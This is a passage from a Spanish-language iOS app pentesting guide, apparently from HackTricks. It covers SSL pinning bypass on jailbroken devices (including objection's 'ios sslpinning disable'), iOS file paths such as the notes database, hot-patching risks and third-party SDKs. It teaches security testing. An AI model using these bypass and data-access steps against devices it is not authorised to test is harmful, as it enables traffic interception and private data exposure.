Para eludir esta protecci√≥n dentro de un dispositivo con jailbreak, puedes instalar la aplicaci√≥n [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) o instalar [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Tambi√©n puedes usar `ios sslpinning disable` de **objection**.

## Miscel√°neos

* En **`/System/Library`** puedes encontrar los frameworks instalados en el tel√©fono utilizados por aplicaciones del sistema.
* Las aplicaciones instaladas por el usuario desde la App Store se encuentran dentro de **`/User/Applications`**.
* Y **`/User/Library`** contiene datos guardados por aplicaciones a nivel de usuario.
* Puedes acceder a **`/User/Library/Notes/notes.sqlite`** para leer las notas guardadas dentro de la aplicaci√≥n.
* Dentro de la carpeta de una aplicaci√≥n instalada (**`/User/Applications/<APP ID>/`**) puedes encontrar algunos archivos interesantes:
  * **`iTunesArtwork`**: El √≠cono utilizado por la app.
  * **`iTunesMetadata.plist`**: Informaci√≥n de la app utilizada en la App Store.
  * **`/Library/*`**: Contiene las preferencias y cach√©. En **`/Library/Cache/Snapshots/*`** puedes encontrar la captura realizada a la aplicaci√≥n antes de enviarla al fondo.

### Actualizaci√≥n Forzada / Parcheo en Caliente

Los desarrolladores pueden **parchear todas las instalaciones de su aplicaci√≥n instant√°neamente** sin tener que volver a enviar la aplicaci√≥n a la App Store y esperar su aprobaci√≥n.\
Para este prop√≥sito, se suele utilizar [**JSPatch**](https://github.com/bang590/JSPatch). Pero tambi√©n hay otras opciones como [Siren](https://github.com/ArtSabintsev/Siren) y [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Este es un mecanismo peligroso que podr√≠a ser abusado por SDKs de terceros maliciosos, por lo tanto, se recomienda verificar qu√© m√©todo se utiliza para la actualizaci√≥n autom√°tica (si lo hay) y probarlo.** Podr√≠as intentar descargar una versi√≥n anterior de la app para este prop√≥sito.

### Terceros

Un problema de los SDKs de terceros es que **no hay control granular sobre las caracter√≠sticas ofrecidas por el SDK**. Podr√≠as demandar al SDK y tener todas las caracter√≠sticas (incluyendo fugas de diagn√≥stico y conexiones HTTP inseguras), o no usarlo. Adem√°s, generalmente no es posible para los desarrolladores de aplicaciones **parchear una vulnerabilidad** en el SDK.\
Adem√°s, algunos SDKs comienzan a **contener malware una vez que son muy confiables** por la comunidad.

Adem√°s, las caracter√≠sticas que estos servicios proporcionan pueden involucrar **servicios de seguimiento para monitorear el comportamiento del usuario** mientras usa la app, vender anuncios publicitarios o mejorar la experiencia del usuario. La desventaja de los servicios de terceros es que los desarrolladores no conocen los detalles del c√≥digo ejecutado a trav√©s de bibliotecas de terceros. En consecuencia, no se debe enviar m√°s informaci√≥n de la necesaria a un servicio, y no se debe divulgar informaci√≥n sensible.

La desventaja es que un **desarrollador no conoce en detalle qu√© c√≥digo se ejecuta a trav√©s de bibliotecas de terceros** y, por lo tanto, renuncia a la visibilidad. En consecuencia, se debe asegurar que no se env√≠e m√°s de la informaci√≥n necesaria al servicio y que no se divulgue informaci√≥n sensible.

La mayor√≠a de los servicios de terceros se implementan de dos maneras:

* con una biblioteca independiente
* con un SDK completo

Todos los datos que se env√≠an a servicios de terceros deben ser anonimizados para evitar la exposici√≥n de PII (Informaci√≥n Personal Identificable) que permitir√≠a al tercero identificar la cuenta del usuario.

Puedes encontrar las **bibliotecas utilizadas por una aplicaci√≥n** ejecutando **`otool`** contra la app (y **ejecut√°ndolo** **contra** **cada** biblioteca **compartida** para encontrar m√°s bibliotecas compartidas utilizadas).

## **Referencias**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)

## M√°s Informaci√≥n

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Curso gratuito de IOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Versi√≥n Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Versi√≥n Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las herramientas comunitarias **m√°s avanzadas**.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking de AWS desde cero hasta h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
